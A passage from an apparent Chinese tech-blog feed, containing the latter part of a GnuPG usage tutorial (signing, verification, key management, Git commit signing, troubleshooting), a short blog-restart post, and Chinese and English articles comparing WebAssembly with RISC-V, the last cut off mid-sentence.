YhTtapNgkQ++mwPbH4WKeOFQ58U5dZ7C+R8rrucRRYQBRTH6AJQY82aV1KXTqyF1
D8c/2ANW7aCWr8W/ogCbEqH47VE3foP+aSD+JMPtdnaYWIPzyr5x5lw6ASwxD4hB
ikOUcJTxp+GyFLTd3n1zCvSP9ZQzvolur7soqZVP8t4hxlALGL+KYN4YgubcPt5y
bucMYWkbLlZM+AuAYzSCLaSmkgkiYUFEkwKJWdLr+NJGAY5Mk+bnEP2k/kKxl9vo
/LVsloiYbg9M184LxUNfZRBnKcI9vKw/C6uU2Ee5wKUMsy3Epnp60Fe5u5fj5yn7
0JjMBmY+gQ==
=8K/i
-----END PGP MESSAGE-----
</code></pre></div><h3 id="解密">解密</h3>
<p>有了密文就要对其进行解密得到原文。注意要进行解密，你必须有接受者的<strong>私钥</strong>。公钥是公开的，任何人都可以查看、使用，而<strong>私钥</strong>是私有的，一定要保管好，如果泄露了这个 GPG 密钥就等同于失效了，需要吊销。这就是非对称加密</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">	gpg --decrypt test.txt.asc --output out.txt
</code></pre></div><p>其中<code>--decrypt</code>声明该命令进行解密，简写为<code>-d</code>，<code>--output</code>指定输出文件，默认输出到终端。注意解密时需要输入你密钥的密码，所以也一定要保管好密码</p>
<h3 id="签名">签名</h3>
<p>有的时候不需要对文件进行签名，只需要确保文件是由本人发出的，这个时候就可以用到签名</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --sign test.txt
</code></pre></div><p>会生成二进制的签名文件<code>test.txt.gpg</code>，如果想生成文本类型的签名，使用</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --clearsign test.txt
</code></pre></div><p>会生成文本类型的签名文件<code>test.txt.asc</code></p>
<p>注意以上两种方式原文和签名是在同一个文件中，查看<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
-----BEGIN PGP SIGNATURE-----

iQFDBAEBCAAtFiEECzxS8e8HsU6nxFyaTCbS5FH/2vEFAl6FX+cPHG5haXZlQHRl
c3QuY29tAAoJEEwm0uRR/9rxGNsH/AmjJiT19q5caq9Pe8tMRnR2yvZIGWbMD3Ch
UTkyGMkSPMIo6XRpYPlANe2/dddBT2l7EAPy2lAxaa8LcjsxtRhJG4GxMaCcujik
M6MX3IOfa1m9aDP1IY3Sh2U07j3t+8dawahR8EUF2D+rtvx24ybnwpWpKbDVsGyp
Mt06BI3pWC3opMRYPCl21IBhPhaPPnvXF7X8DMP+2VqZye2juX2oG1KMkZWQuiBb
/D7DYlx6/ainu0cJw6UL8YXHag7tkUeKtTPQbBpCsszOuxJZ74gduIUzDcokayCB
DM9qB/GpUyVOOTwfLMBta6JP5BO8ppPaPdPX46kKDqLKG7eh4bQ=
=Q4/W
-----END PGP SIGNATURE-----
</code></pre></div><p>因为是签名，不会对内容进行加密，所以直接显示原文。如果想把原始文件分离出来，使用</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --output out.txt -d test.txt.gpg
</code></pre></div><p>分离的同时还顺便校验了签名。注意这里<code>test.txt.gpg</code>是上面生成的二进制<strong>签名</strong>文件，也可以用<code>test.txt.asc</code></p>
<p>如果每次都要分离，就很麻烦，而且没有安装 GPG 的用户就无法使用源文件了。所以更好的方式是分离源文件和签名文件</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --detach-sign --armor test.txt
</code></pre></div><p>这样会生成一个单独的、文本类型的签名文件<code>test.txt.sig</code></p>
<blockquote>
<p>注意：如果有多个私钥，可以用<code>-u</code>参数选择</p>
</blockquote>
<h3 id="签名校验">签名校验</h3>
<p>收到文件和签名文件后，需要对签名进行校验</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --verify test.txt.sig test.txt
</code></pre></div><p>如果签名校验成功，会显示</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg: 签名建立于 四  4/ <span class="m">2</span> 11:49:35 <span class="m">2020</span> CST
gpg:               使用 RSA 密钥 34B368EFC6FA8941B4A096CFFA4C884FBE8164D7
gpg: 完好的签名，来自于 “creedowl &lt;creedowl@gmail.com&gt;” <span class="o">[</span>绝对<span class="o">]</span>
</code></pre></div><h3 id="导入导出">导入导出</h3>
<p>当你需要与他人交换数据时，需要导出自己的公钥，同时导入他人的公钥；而如果你更换电脑，就需要导出自己的私钥。这就涉及到了密钥的导入导出</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output public_key.txt --export naive
</code></pre></div><p>上述命令用于导出公钥，相关参数在上文都有介绍。接着你就可以把<code>public_key.txt</code>发布给他人</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -a --output private_key.txt --export-secret-keys naive
</code></pre></div><p>上述命令用于导出私钥，一定要保管好，建议在脱机情况下进行操作</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --improt <span class="o">[</span>密钥文件<span class="o">]</span>
</code></pre></div><p>上述命令用于导入密钥，不区分公钥私钥</p>
<h3 id="查看所有密钥">查看所有密钥</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -k
</code></pre></div><h3 id="生成吊销证书">生成吊销证书</h3>
<p>当你的私钥泄露或者更换时，需要吊销失效的密钥，这时就需要使用吊销证书</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --gen-revoke naive
</code></pre></div><p>接着选择吊销原因，就能生成吊销证书</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">sec  rsa2048/4C26D2E451FFDAF1 2020-04-02 naive (too young too simple) &lt;naive@test.com&gt;

要为这个密钥创建一个吊销证书吗？(y/N) y
请选择吊销的原因：
  0 = 未指定原因
  1 = 密钥已泄漏
  2 = 密钥被替换
  3 = 密钥不再使用
  Q = 取消
（也许您会想要在这里选择 1）
您的决定是什么？ 1
请输入描述（可选）；以空白行结束：
&gt;
吊销原因：密钥已泄漏
（未给定描述）
这样可以吗？ (y/N) y
已强行使用 ASCII 字符封装过的输出。
-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: This is a revocation certificate

****
-----END PGP PUBLIC KEY BLOCK-----
已创建吊销证书。

请把这个文件转移到一个您可以藏起来的介质上；如果坏人获取到了这
份证书的话，那么他就能使用它并让您的密钥无法继续使用。把此证书
打印出来再存放到安全的地方也是很好的方法，以免您的保存媒体变得
不可读。但是千万小心：您机器上的打印系统可能会在打印过程中储存
这些数据，并使得其他人看到！
</code></pre></div><p>只需要保存中间的吊销证书，当密钥泄露时将其发送到公钥服务器，就可以吊销旧密钥</p>
<h3 id="编辑密钥">编辑密钥</h3>
<p>有时候需要对密钥进行编辑，如修改信任度，生成子密钥等，使用以下命令</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --edit-key naive
</code></pre></div><p>接着就会进入交互模式等待命令，输入<code>help</code>可以查看所有操作</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">gpg (GnuPG/MacGPG2) 2.2.17; Copyright (C) 2019 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

私钥可用。

sec  rsa2048/4C26D2E451FFDAF1
     创建于：2020-04-02  有效至：永不       可用于：SC
     信任度：绝对        有效性：绝对
ssb  rsa2048/A86AB46BDC677F8F
     创建于：2020-04-02  有效至：永不       可用于：E
[ 绝对 ] (1). naive (too young too simple) &lt;naive@test.com&gt;

gpg&gt;
</code></pre></div><h2 id="使用-gpg-签名-git-commit">使用 GPG 签名 Git Commit</h2>
<p>这就是我使用 GPG 的原因，下面开始配置，首先配置 git</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># 设置全局默认密钥</span>
git config --global user.signingkey &lt;密钥ID&gt;

<span class="c1"># 设置强制使用GPG签名</span>
git config --global commit.gpgsign <span class="nb">true</span>
</code></pre></div><p>之后在提交时，只需要带上<code>-S</code>参数，就能对提交进行签名</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git commit -S -m <span class="s2">&#34;xxx&#34;</span>
</code></pre></div><p>查看 git 日志时，带上<code>--show-signature</code>参数就能看到签名信息</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git log --show-signature
</code></pre></div><p>最后一步，需要把你的公钥提交到 github，否则它怎么知道这个签名是你的呢？将之前生成的文本类型的公钥<code>public_key.txt</code>提交到 <a href="https://github.com/settings/keys">github</a>，之后你的提交在 github 上就有像开头那样的绿色小勾了</p>
<h2 id="faq">FAQ</h2>
<h3 id="解决git提交时出现error-gpg-failed-to-sign-the-data">解决git提交时出现<code>error: gpg failed to sign the data</code></h3>
<p>以下是原始解决方案，虽然能解决问题，但体验不好，在 IDE 中提交时难以输入密码，建议 MacOS 用户采用上面说的 <code>GPG Suite</code>进行操作，它可以接管密码输入操作，弹出一个独立窗口用于输入，还能将密码添加到 iCloud 钥匙串中，避免重复输入密码。如果你已经在使用<code>GPG Suite</code>，但仍然遇到了这个问题，可以尝试重装<code>GPG Suite</code></p>
<ol>
<li>
<p>导出密钥（私钥）<strong>重要</strong></p>
</li>
<li>
<p>卸载 GPG</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew uninstall gnupg gnutls
   
brew cask uninstall gpg-suite
</code></pre></div></li>
<li>
<p>删除 gpg 文件夹，<strong>请确认已经导出密钥</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">rm -rf ~/.gnupg
</code></pre></div></li>
<li>
<p>重新安装<code>GPG Suite</code>，<strong>不需要手动安装 GPG</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div></li>
<li>
<p>导入密钥</p>
</li>
</ol>
<p>这时 <code>GPG Suite</code>应该已经可以正常工作了</p>
<hr>
<p><em>原始方案</em></p>
<p>首先测试<code>gpg</code>工作是否正常</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> <span class="p">|</span> gpg --clearsign
</code></pre></div><p>如果出现下面的错误</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
gpg: 签名时失败： Inappropriate ioctl for device
gpg: [stdin]: clear-sign failed: Inappropriate ioctl for device
</code></pre></div><p>说明<code>gpg</code>无法打开输入密码的窗口。在生成<code>gpg key</code>时，如果指定了密码，在签名时就需要输入。而这时<code>gpg</code>不知道从哪里读取输入，所以可以用以下的命令指定<code>tty</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">export</span> <span class="nv">GPG_TTY</span><span class="o">=</span><span class="k">$(</span>tty<span class="k">)</span> 
</code></pre></div><p>这样就可以正常弹出输入密码的窗口。</p>
<hr>
<p>但我不喜欢这个全屏窗口，主要是在mac上<code>gpg</code>语言为中文时，这个窗口会乱码，所以用另一个方法解决。编辑<code>~/.gnupg/gpg.conf</code>，添加以下内容</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">use-agent 
pinentry-mode loopback
</code></pre></div><p>再编辑<code>~/.gnupg/gpg-agent.conf</code>，添加以下内容</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">allow-loopback-pinentry
</code></pre></div><p>最后输入<code>echo RELOADAGENT | gpg-connect-agent</code>重启<code>agent</code>就生效了，这样可以直接在终端输入密码</p>
<blockquote>
<p><a href="https://d.sb/2016/11/gpg-inappropriate-ioctl-for-device-errors">source</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/renew/</id>
        <title><![CDATA[重新开始]]></title>
        <updated>2020-03-19T13:28:13+08:00</updated>
        <link href="https://blog.creedowl.com/posts/renew/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/renew/"><![CDATA[<p>突然发现距上一篇blog发布已经过去了快一年的时间，原先的blog也疏于打理，只有寥寥几篇文章，图床基本失效。主要因为我比较懒，认真整理一篇blog也是费时费力的事情。但自己整理一些文章是很有意义的事情，能记录下自己的学习历程，总结知识，再次遇到相同的问题也可以回头参考。</p>
<p>blog一直没更新有个诱因是微博图床开启了防盗链，导致blog中许多图片都无法访问了<del>老王背锅</del>，又懒得修复。同时看上了<a href="https://gohugo.io/">hugo</a>这个框架，正好也在学习<code>golang</code>，就想从<code>hexo</code>更换到<code>hugo</code>。但这两个框架有个很大的区别<del>我觉得</del>，就是<code>hexo</code>是一堆前端工程师搞的，而<code>hugo</code>是一堆后端工程师搞的，这就导致了<code>hugo</code>没有啥好看的主题，也就一直鸽下去了。</p>
<p>去年年中的时候就打算和@queensferry写一个Hugo主题<a href="https://github.com/queensferryme/hugo-theme-verse">verse</a>，立项的时候很多想法，但做起来就不想动了。摸完页面框架后就鸽了，一方面实在不会设计，另一方面调各种样式是真的蛋疼。鸽了半年又捡起来<del>虽然我没写啥</del>，不过渐渐也有点样子了。但今天发现了一个很棒的主题<a href="https://github.com/Track3/hermit">hermit</a>，几乎就是我想要的，里面很多设计就是我当初构想的内容，马上捡起了blog。</p>
<p>这一年来也计划整理个人笔记软件，在尝试了数个软件后，有印象笔记，为知笔记，有道云笔记，onenote及一堆开源笔记应用，都不太满足我的需求。最后发现了notion这个东西贼香（主要对学生免费了），最后就选择了它。不过这也导致我手上一堆笔记分散在各处，打算后面整理清楚<del>水</del>几篇blog出来。</p>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/</id>
        <title><![CDATA[WebAssembly 与 RISC-V 指令集架构的对比]]></title>
        <updated>2020-03-15T09:51:51+08:00</updated>
        <link href="https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/"/>
        <content type="text/html" src="https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/"><![CDATA[<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">A Comparison between WebAssembly and RISC-V</div><div class="kg-bookmark-description">WebAssembly and RISC-V are both new Instruction Set Architectures (ISAs) that evolved in the recent 10 years. Let’s do a comparison.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://invariant.me/favicon.ico" alt="WebAssembly 与 RISC-V 指令集架构的对比"><span class="kg-bookmark-author">Heyang Zhou</span><span class="kg-bookmark-publisher">The Invariant</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://invariant.me/content/images/2020/03/wasm-riscv.png" alt="WebAssembly 与 RISC-V 指令集架构的对比"></div></a></figure><img src="https://blog.invariant.cn/content/images/2020/03/wasm-riscv.png" alt="WebAssembly 与 RISC-V 指令集架构的对比"><p>WebAssembly 与 RISC-V 都是近十年内新出现的指令集架构。摘录一段 <a href="https://webassembly.org/">WebAssembly 官方网站</a>的介绍：</p><blockquote>WebAssembly (abbreviated <em><em>Wasm</em></em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust, enabling deployment on the web for client and server applications.</blockquote><blockquote>WebAssembly （简写为 Wasm）是一种栈虚拟机的二进制指令格式。Wasm 被设计为 C/C++/Rust 等高级语言的可移植编译目标，从而允许客户端和服务器应用程序部署在 Web 上。</blockquote><p>和 <a href="https://riscv.org/">RISC-V 的官方介绍</a>：</p><blockquote>RISC-V is a free and open ISA enabling a new era of processor innovation through open standard collaboration. Born in academia and research, RISC-V ISA delivers a new level of free, extensible software and hardware freedom on architecture, paving the way for the next 50 years of computing design and innovation.</blockquote><blockquote>RISC-V 是一种自由、开放的指令集架构，通过开放标准协作使新的处理器创新成为可能。RISC-V 来自学术研究，提供了更加自由、可扩展的软硬件架构，为未来 50 年的计算技术设计与创新铺平道路。</blockquote><p>这两种指令集架构看起来很不一样。WebAssembly 的目标平台主要是 JIT 编译器（以及浏览器）；而 RISC-V 则专为硬件设计，其目标之一即是在 FPGA 和电路上的高效实现。WebAssembly 与 RISC-V 的关系似乎类似于早期的 Java 与 x86：一种字节码格式，和一个硬件指令集。它们有什么关系呢？</p><p>其实字节码格式与硬件指令集的分界线并不是非常清晰。例如在 x86 指令集的早期实现中，指令经过一层解码直接被分发到执行电路去执行。但近年的 Intel/AMD CPU 采用了不同的执行策略：每条 x86 指令首先被翻译为某种内部 RISC 指令，执行组件收到的指令其实已经是翻译后的 RISC 编码格式。这实际上相当于从 x86 到内部 RISC 指令集的某种“硬件实时编译”过程。同时，<a href="https://en.wikipedia.org/wiki/Java_processor">Java</a> 与 <a href="https://github.com/piranna/wasmachine">WebAssembly</a> 也有实验性的硬件实现，虽然它们还不能赶上 JIT 编译器在现代 CPU 上所能达到的效率。</p><blockquote>我们已经可以看到 RISC-V 指令集<a href="https://github.com/nervosnetwork/ckb-vm">被用于区块链的智能合约</a>，而 WebAssembly 此前几乎是原生语言智能合约的唯一选择。</blockquote><p>在这里我们对 WebAssembly 与 RISC-V 做一个比较。</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>WebAssembly</th>
<th>RISC-V</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><font color="#512da8">开源</font></strong></td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td><strong><font color="#512da8">内存架构</font></strong></td>
<td>Load/Store</td>
<td>Load/Store</td>
</tr>
<tr>
<td><strong><font color="#512da8">浮点支持</font></strong></td>
<td>是</td>
<td>是 (定义于扩展)</td>
</tr>
<tr>
<td><strong><font color="#512da8">SIMD</font></strong></td>
<td>是</td>
<td>是 (定义于扩展)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">代码/数据分离</font></strong></td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">指针宽度</font></strong></td>
<td>32</td>
<td>32/64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">最大数据宽度</font></strong></td>
<td>64</td>
<td>32/64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">静态类型</font></strong></td>
<td>弱</td>
<td>无</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">控制流约束</font></strong></td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">机器模型</font></strong></td>
<td>栈机</td>
<td>寄存器机</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">内存布局</font></strong></td>
<td>线性</td>
<td>分页</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">内存保护</font></strong></td>
<td>无</td>
<td>RWX</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">多线程同步</font></strong></td>
<td>CAS</td>
<td>LL/SC</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">指令编码</font></strong></td>
<td>变长</td>
<td>定长 (2 或 4 字节)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">与环境交互</font></strong></td>
<td>导入函数</td>
<td>系统调用</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">可执行映像格式</font></strong></td>
<td>WebAssembly</td>
<td>ELF</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p><strong>1. 代码/数据分离</strong></p><p>包括 RISC-V 在内的大多数现代架构对代码和数据使用同一个地址空间，但是 WebAssembly 没有这样做。实际上，运行中的代码甚至没有办法读/写它自己。这个设计的原因可能是：</p><ul><li>简化 JIT 编译器的实现。如果代码可以自我修改，那么 JIT 编译器则需要有检测修改和重新生成目标代码的能力，而这需要相当复杂的实现机制。</li><li>WebAssembly 假设了一个功能完善的运行环境。运行环境会处理链接、重定位等准备工作，程序不需要关心怎样把它自己运行起来。</li><li>安全。能够动态生成和修改的代码是个很危险的攻击点。</li></ul><p><strong>2. 静态类型与控制流约束</strong></p><p>WebAssembly 具有很强的“结构性”。其标准要求所有函数调用、循环、跳转和值类型遵循特定的结构约束，例如向一个接受三个参数的函数传入两个参数、跳转到其他函数里的某个位置、在两个整数上执行浮点加操作等都会导致编译/验证失败。RISC-V 则不具有此类约束，指令的有效与否只取决于其自身的编码是否正确。</p><p><strong>3. 机器模型</strong></p><p>WebAssembly 是一种<a href="https://en.wikipedia.org/wiki/Stack_machine">栈机</a>指令集，而 RISC-V 是一种<a href="https://en.wikipedia.org/wiki/Register_machine">寄存器机</a>指令集。</p><p>在 WebAssembly 中，每条指令<em>语义上</em>会从值栈上弹出它的操作数，然后将结果推入值栈。然而与 Java 等其他基于栈机的字节码格式不同的是，程序中任意指令处值栈的结构都可以被静态确定。这一设计有利于更好的编译优化。</p><p>在 RISC-V 中，每条指令的编码包含 0 - 3 个寄存器编号 <code>rd, rs1, rs2</code> 。其中 <code>rs1</code>与 <code>rs2</code> 是输入寄存器， <code>rd</code> 是输出寄存器。除内存访问、特权指令等特殊类型指令外，每条指令只从输入寄存器中读取数据，在输出寄存器中存放结果。</p><p><strong>4. 内存管理</strong></p><p>虽然 WebAssembly 与 RISC-V 都定义了一个无类型的、字节可寻址的内存，它们之间还是有一些细节上的区别。WebAssembly 的内存等同于一个大数组：有效地址从 0 开始，连续扩展到某个由程序定义初值、可增长的上限。而 RISC-V 则使用了<a href="https://en.wikipedia.org/wiki/Virtual_memory">虚拟内存</a>，用页表将地址映射到物理内存。</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/03/wasm-riscv-comp.png" class="kg-image" alt="WebAssembly 与 RISC-V 指令集架构的对比"><figcaption>内存布局</figcaption></figure><p>WebAssembly 的内存设计虽然简洁且易于实现，但存在一些问题：</p><ul><li>地址 0 是有效的，这会导致一些程序在解引用空指针时的行为与预期不同。</li><li>无法建立不映射到任何物理地址的“无效”地址区间，因此无法实现多线程环境下的栈保护页 (guard page) 。</li></ul><p><strong>5. 同步机制</strong></p><p>图灵完备的计算机器需要至少一条条件分支指令。同样，支持多线程同步的指令集架构需要至少一条“原子条件分支”指令。这类指令在 WebAssembly 下是 <code>i{32,64}.atomic.rmw.cmpxchg</code>，在 RISC-V 下是 <code>LR/SC</code>，分别对应 <a href="https://en.wikipedia.org/wiki/Compare-and-swap">CAS</a> 模型和 <a href="https://en.wikipedia.org/wiki/Load-link/store-conditional">LL/SC</a> 模型。</p><p>LL/SC 的语义比 CAS 更强。CAS 存在难以解决的 <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA 问题</a>，但 LL/SC 不受影响。这也意味着在 CAS 架构上模拟 LL/SC 比反过来要困难很多。</p><hr><blockquote>Note: 我写过一个 RISC-V 解释器 <a href="https://github.com/losfair/FlatRv">FlatRv</a> ，且正在参与一个 WebAssembly JIT 运行环境 <a href="https://github.com/wasmerio/wasmer">Wasmer</a> 的开发。如果你感兴趣可以点个 Star :)</blockquote>]]></content>
        <author>
            <name><![CDATA[The Invariant 中文]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/a-comparison-between-webassembly-and-risc-v/</id>
        <title><![CDATA[A Comparison between WebAssembly and RISC-V]]></title>
        <updated>2020-03-13T16:38:53+08:00</updated>
        <link href="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"/>
        <content type="text/html" src="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"><![CDATA[<img src="https://invariant.me/content/images/2020/03/wasm-riscv.png" alt="A Comparison between WebAssembly and RISC-V"><p><a href="https://webassembly.org/">WebAssembly</a> and <a href="https://riscv.org/">RISC-V</a> are both new Instruction Set Architectures (ISAs) that evolved in the recent 10 years. Quoting the introduction to WebAssembly on <a href="https://webassembly.org">webassembly.org</a>:</p><blockquote>WebAssembly (abbreviated <em>Wasm</em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust, enabling deployment on the web for client and server applications.</blockquote><p>and the introduction to RISC-V on <a href="https://riscv.org">riscv.org</a>:</p><blockquote>RISC-V is a free and open ISA enabling a new era of processor innovation through open standard collaboration. Born in academia and research, RISC-V ISA delivers a new level of free, extensible software and hardware freedom on architecture, paving the way for the next 50 years of computing design and innovation.</blockquote><p>It seems that these two ISAs are quite different. WebAssembly is primarily targeted at JIT compilation and in particular, browsers, while RISC-V is designed for hardware and one of its goals is efficient implementation on FPGAs and circuits. They're like Java and x86 respectively in the old days: A bytecode format, and a hardware instruction set. How can they be related?</p><p>Well, the boundary between bytecodes and real hardware instruction sets is actually a bit blurred. The x86 instruction set, for example, was once executed directly by the circuits that performs control and arithmetic operations. But now on newer Intel and AMD CPUs, x86 instructions are decoded into a internal RISC format on-the-fly and sent into a RISC core for execution - isn't it some kind of hardware "JIT compilation" similar to what JRE does for Java? Meanwhile, there are also experimental hardware implementations for <a href="https://en.wikipedia.org/wiki/Java_processor">Java</a> and <a href="https://github.com/piranna/wasmachine">WebAssembly</a>, though not being as efficient as what a JIT compiler can achieve on a modern, mature CPU.</p><p>Actually, people are already using RISC-V in a position where WebAssembly has usually been used for: smart contract on blockchains. It is the <a href="https://github.com/nervosnetwork/ckb-vm">CKB VM</a>. Across the blurred line between the WebAssembly bytecode format and the RISC-V hardware instruction set, what are the similarities, and what are the differences?</p><p>Let's do a comparison.</p><h3 id="feature-table">Feature table</h3><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>WebAssembly</th>
<th>RISC-V</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><font color="#512da8">Open source</font></strong></td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td><strong><font color="#512da8">Memory architecture</font></strong></td>
<td>Load/Store</td>
<td>Load/Store</td>
</tr>
<tr>
<td><strong><font color="#512da8">Floating point</font></strong></td>
<td>Yes</td>
<td>Yes (in extension)</td>
</tr>
<tr>
<td><strong><font color="#512da8">SIMD</font></strong></td>
<td>Yes</td>
<td>Yes (in extension)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Separated code and data</font></strong></td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Pointer width</font></strong></td>
<td>32</td>
<td>32 and 64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Maximum data width</font></strong></td>
<td>64</td>
<td>32 and 64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Typing</font></strong></td>
<td>Weak</td>
<td>None</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Control flow</font></strong></td>
<td>Restricted</td>
<td>Arbitrary</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Machine model</font></strong></td>
<td>Stack</td>
<td>Register</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Memory layout</font></strong></td>
<td>Linear</td>
<td>Paged</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Memory protection</font></strong></td>
<td>None</td>
<td>RWX</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Synchronization primitive</font></strong></td>
<td>CAS</td>
<td>LL/SC</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Instruction encoding</font></strong></td>
<td>Variable length</td>
<td>Fixed length (2 or 4 bytes)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Interaction with environment</font></strong></td>
<td>Imported functions</td>
<td>System call</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Executable image format</font></strong></td>
<td>WebAssembly</td>
<td>ELF</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>The similarities are quite common, so I will focus on the differences here.</p><p><strong>1. Separated code and data</strong></p><p>Most modern architectures use a unique addressing space for code and data, including RISC-V. But WebAssembly doesn't, and actually the running code is not even provided with a way to access itself. Possible reasons:</p><ul><li>Simplicity for JIT compilation. If code can modify itself, then the JIT compiler needs to detect the modification and update the corresponding machine code - which is very complex.</li><li>WebAssembly's assumption about a powerful host environment. Linking, etc. will be done entirely by the host, and the program doesn't need to care about bringing itself up.</li><li>Security. Generating code at runtime is dangerous.</li></ul><p><strong>2. Typing and control flow</strong></p><p>WebAssembly is very "structured": The JIT compiler requires all function calls, loops, jumps and value types to conform to structural constraints. For example, you can't pass two values to a function that accepts three arguments, you can't jump to a location in another function, and you can't execute the floating point add instruction on two integers.</p><p>RISC-V however has none of these constraints. Everything is just values in registers and it's up to the programmer to decide how to use them.</p><p><strong>3. Machine model</strong></p><p>WebAssembly is built upon the <a href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> model, while RISC-V (along with most other hardware architectures) is a <a href="https://en.wikipedia.org/wiki/Register_machine">register machine</a>.</p><p>In WebAssembly, <em>semantically</em> any instruction pops its operands (if any) from the value stack, performs the defined operation, and pushes its results (if any) back on to the value stack. However, the structure of the value stack at any point in the program can be statically determined - which is different from the Java bytecode, for example, in that keeping the stack structure statically determinable is not an optimization but a compile-time mandatory requirement.</p><p><strong>4. Memory</strong></p><p>While both ISAs define an untyped, byte-addressable memory, some details are different. Memory in WebAssembly is literally a large byte array: addresses start from zero and continuously span to an upper limit (which can be dynamically increased by executing an instruction). In comparison, RISC-V uses <em><a href="https://en.wikipedia.org/wiki/Virtual_memory">virtual memory</a></em> where page tables are used to map addresses to the underlying physical memory.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/03/wasm-riscv-comp.png" class="kg-image" alt="A Comparison between WebAssembly and RISC-V"><figcaption>Memory layouts</figcaption></figure><p>WebAssembly's memory model, although being simple to implement and efficient when JIT compiled, has several issues compared to RISC-V:</p><ul><li>Address zero is valid, causing programs that assume a crash for dereferencing the null pointer to 